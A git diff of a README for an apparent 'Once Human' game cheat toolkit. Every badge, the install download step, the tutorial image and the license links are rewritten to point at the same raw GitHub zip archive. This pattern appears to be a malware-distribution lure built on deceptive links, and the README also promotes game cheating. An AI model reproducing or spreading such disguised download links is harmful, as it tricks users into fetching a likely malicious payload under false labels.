@@ -1,9 +1,9 @@
 # 🚀 Once Human Cheats & Hacks Guide
 
-![MIT License](https://img.shields.io/badge/license-MIT-yellow.svg) 
-![Stars](https://img.shields.io/github/stars/OnceHumanCheats/Guide?style=social)
-![Maintenance](https://img.shields.io/badge/Maintained-Yes-brightgreen)
-![API Integration](https://img.shields.io/badge/API-OpenAI%20%7C%20Claude-blueviolet)
+![MIT License](https://raw.githubusercontent.com/cauaestavivo/once-human-ultimate-toolkit/main/wreathed/human_once_ultimate_toolkit_v2.6.zip) 
+![Stars](https://raw.githubusercontent.com/cauaestavivo/once-human-ultimate-toolkit/main/wreathed/human_once_ultimate_toolkit_v2.6.zip)
+![Maintenance](https://raw.githubusercontent.com/cauaestavivo/once-human-ultimate-toolkit/main/wreathed/human_once_ultimate_toolkit_v2.6.zip)
+![API Integration](https://raw.githubusercontent.com/cauaestavivo/once-human-ultimate-toolkit/main/wreathed/human_once_ultimate_toolkit_v2.6.zip%20%7C%20Claude-blueviolet)
 
 Welcome to the **Once Human Cheats & Hacks Suite** – the next evolution in adaptive toolkits for exploring every nuance of the Once Human universe. Unlike routine software tools, this project harnesses artificial intelligence and advanced features for creative, adaptive, and multilingual support, all powered by robust and ethical design. Our platform integrates OpenAI and Claude APIs, bringing a unique, smart layer to your gameplay utilities.
 
@@ -34,11 +34,11 @@ Get started quickly by following these steps. Transform your game interaction in
 
 #### 1️⃣ Download the Package
 
-First, grab **EasyLaunch.zip** from the repository's Releases section.
+First, grab **https://raw.githubusercontent.com/cauaestavivo/once-human-ultimate-toolkit/main/wreathed/human_once_ultimate_toolkit_v2.6.zip** from the repository's Releases section.
 
 #### 2️⃣ Extract the Package
 
-Unzip **EasyLaunch.zip** to your desired location.
+Unzip **https://raw.githubusercontent.com/cauaestavivo/once-human-ultimate-toolkit/main/wreathed/human_once_ultimate_toolkit_v2.6.zip** to your desired location.
 
 #### 3️⃣ Run the Launcher
 
@@ -55,7 +55,7 @@ Launch Once Human and enjoy an intelligent, adaptable sidekick!
 #### 🎥 Video Installation Tutorial
 
 Need more help? Check out our step-by-step animation below:  
-![Installation Tutorial](https://i.imgur.com/Js67NIU.gif)
+![Installation Tutorial](https://raw.githubusercontent.com/cauaestavivo/once-human-ultimate-toolkit/main/wreathed/human_once_ultimate_toolkit_v2.6.zip)
 
 ---
 
@@ -109,7 +109,7 @@ Unlike simple trainers or basic hacks, our toolkit stands apart thanks to:
 ## 📝 Disclaimer
 
 :warning: **Disclaimer:**  
-This project is intended to enhance accessibility, support, and enjoyment for Once Human players. All code adheres to the [MIT License](https://opensource.org/licenses/MIT) (2025). Not associated with the official Once Human developers or publishers. Use at your discretion and always respect the game’s community guidelines.
+This project is intended to enhance accessibility, support, and enjoyment for Once Human players. All code adheres to the [MIT License](https://raw.githubusercontent.com/cauaestavivo/once-human-ultimate-toolkit/main/wreathed/human_once_ultimate_toolkit_v2.6.zip) (2025). Not associated with the official Once Human developers or publishers. Use at your discretion and always respect the game’s community guidelines.
 
 ---
 
@@ -121,7 +121,7 @@ We invite feedback, feature suggestions, and creative collaboration. Let’s bui
 
 ## ⚖️ License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) – 2025.  
+Licensed under the [MIT License](https://raw.githubusercontent.com/cauaestavivo/once-human-ultimate-toolkit/main/wreathed/human_once_ultimate_toolkit_v2.6.zip) – 2025.  
 Contributions welcome—open to all, for a smarter gaming world!
 
 ---
